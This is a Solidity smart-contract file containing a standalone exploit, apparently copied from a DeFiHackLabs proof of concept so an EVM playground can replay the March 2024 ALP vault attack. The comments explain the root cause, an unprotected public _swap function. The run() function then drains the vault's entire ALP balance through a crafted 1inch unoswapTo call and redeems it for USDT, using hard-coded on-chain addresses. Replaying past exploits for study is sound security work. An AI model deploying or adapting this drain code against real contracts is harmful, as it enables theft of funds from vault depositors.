// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2024-03-ALP).
// The DeFiHackLabs PoC runs the whole attack INLINE in the Foundry test contract
// (attacker = address(this); the test also implements stub swap()/getReserves()
// callbacks used by the 1inch unoswapTo "pool" hook), so there is no standalone
// exploit contract to deploy. This contract is a faithful, self-contained copy of
// that inline attack (testExploit -> run) so the playground can deploy it and
// record run(). Logic and constants are copied verbatim from
// test/ALP_exp.sol (DeFiHackLabs 2024-03-ALP_exp).
//
// Root cause: StableCoinVault's internal swap helper `_swap(tokenForSwap,
// aggregatorData)` is declared PUBLIC with no access control. Anyone can call it
// directly, which (a) approves the vault's ENTIRE balance of `tokenForSwap` to the
// 1inch router and (b) forwards 100% attacker-controlled calldata to that router.
// The attacker crafts a 1inch unoswapTo() order that pulls the vault's full ALP
// balance to themselves, then redeems the stolen ALP for USDT via ApolloX's normal
// redeem path.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
}

struct ApolloXRedeemData {
    address alpTokenOut;
    uint256 minOut;
    address tokenOut;
    bytes aggregatorData;
}

struct RedeemData {
    uint256 amount;
    address receiver;
    ApolloXRedeemData apolloXRedeemData;
}

interface IVun {
    // The vault's internal `_swap` helper, deployed with PUBLIC visibility
    // (should have been `internal`) -- the entire vulnerability.
    function _swap(address tokenForSwap, bytes memory agg) external;
}

interface IAlp {
    function balanceOf(address owner) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function maxRedeem(address owner) external returns (uint256 maxShares);
    function redeem(uint256 shares, RedeemData calldata redeemData) external;
}

contract AlpDrain {
    IERC20 constant USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IAlp constant ALP_APO = IAlp(0x9Ad45D46e2A2ca19BBB5D5a50Df319225aD60e0d);
    IVun constant VUN = IVun(0xD188492217F09D18f2B0ecE3F8948015981e961a);

    // The 1inch "pool" callback hook the attacker's own crafted pool descriptor
    // routes back to `address(this)` -- a no-op stub is enough for the
    // transferFrom-shaped unoswapTo order to land the stolen ALP here.
    function swap(uint256, uint256, address, bytes memory) external {}

    function getReserves() public view returns (uint256, uint256, uint256) {
        return (1, 1, block.timestamp);
    }

    // Faithful copy of ContractTest.testExploit() -- runs as this contract
    // (equivalent to attacker = address(this) in the original PoC).
    function run() external {
        uint256 vunBalance = ALP_APO.balanceOf(address(VUN));

        uint256[] memory pools = new uint256[](1);
        // 1inch unoswapTo pool descriptor: high bits are routing/flag bits taken
        // verbatim from the original PoC's descriptor
        // (test/ALP_exp.sol:53, constant 1_457_847_883_966_391_224_294_152_661_087_436_089_985_854_139_374_837_306_518),
        // low 160 bits are swapped in for THIS contract's own address --
        // "translate into hex, contain your address" (test/ALP_exp.sol:53).
        uint256 flagBits = 0x3b74a4600000000000000000000000000000000000000000;
        pools[0] = flagBits | uint256(uint160(address(this)));

        VUN._swap(
            address(ALP_APO),
            abi.encodeWithSignature(
                "unoswapTo(address,address,uint256,uint256,uint256[])",
                address(this),
                address(ALP_APO),
                vunBalance,
                0,
                pools
            )
        );

        ALP_APO.maxRedeem(address(this));
        ALP_APO.approve(address(ALP_APO), vunBalance);

        RedeemData memory r;
        r.amount = vunBalance;
        r.receiver = address(this);
        r.apolloXRedeemData.alpTokenOut = address(USDT);
        r.apolloXRedeemData.minOut = 0;
        r.apolloXRedeemData.tokenOut = address(USDT);
        r.apolloXRedeemData.aggregatorData = "";
        ALP_APO.redeem(vunBalance, r);
    }
}
